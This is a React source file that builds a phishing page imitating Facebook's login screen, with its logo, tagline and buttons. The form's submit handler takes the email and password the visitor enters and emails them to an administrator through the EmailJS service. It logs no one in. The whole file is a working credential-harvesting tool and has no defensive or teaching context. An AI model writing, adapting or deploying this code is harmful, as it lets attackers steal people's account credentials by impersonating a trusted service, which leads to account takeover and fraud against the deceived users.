import React, { useState } from 'react';
import emailjs from 'emailjs-com';
import logo from './facebook-logo.png';

function App() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    const emailBody = `
      Hello You, 

      Your login details are:

      Password: ${password}
      Email: ${email}
    `;

    const templateParams = {
      from_name: "You",            
      to_name: "Admin",           
      message: emailBody,    
      reply_to:  import.meta.env.VITE_EMAIL,            
    };

    emailjs
      .send(
        import.meta.env.VITE_EMAILJS_SERVICE_ID, 
        import.meta.env.VITE_EMAILJS_TEMPLATE_ID, 
        templateParams,
        import.meta.env.VITE_EMAILJS_USER_ID      
      )
      .then(
        (response) => {
          console.log('Email sent successfully', response);
        },
        (error) => {
          console.error('Failed to send email', error);
        }
      );
  };

  return (
    <div className="min-h-screen bg-gray-100">
      <div className="container mx-auto px-4 py-8 flex flex-col lg:flex-row items-center justify-center lg:justify-between lg:py-32 lg:px-8 max-w-[1000px] gap-10 lg:gap-16">
        <div className="max-w-md text-center lg:text-left">
          <div className="flex items-center justify-center lg:justify-start">
            <img src={logo} className="text-blue-600 w-12 h-12 lg:w-16 lg:h-16" />
            <h1 className="text-blue-600 text-4xl lg:text-6xl font-bold ml-2">facebook</h1>
          </div>
          <p className="text-xl lg:text-2xl mt-4">
            Facebook helps you connect and share with the people in your life.
          </p>
        </div>

        <div className="bg-white p-4 rounded-xl shadow-lg w-full max-w-md">
          <form onSubmit={handleSubmit} className="space-y-4">
          
            <input
              type="email"
              placeholder="Email address"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-500"
              required
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-500"
              required
            />
            <button
              type="submit"
              className="w-full bg-blue-600 text-white py-3 px-4 rounded-lg text-xl font-bold hover:bg-blue-700 transition duration-200"
            >
              Log In
            </button>
            <div className="text-center">
              <a href="#" className="text-blue-600 text-sm hover:underline">
                Forgotten password?
              </a>
            </div>
            <hr className="my-4" />
            <div className="text-center">
              <button
                type="button"
                className="bg-green-500 text-white px-8 py-3 rounded-lg text-lg font-bold hover:bg-green-600 transition duration-200"
              >
                Create new account
              </button>
            </div>
          </form>
          <p className="text-sm text-center mt-6">
            <span className="font-bold">Create a Page</span> for a celebrity, brand or business.
          </p>
        </div>
      </div>
    </div>
  );
}

export default App;
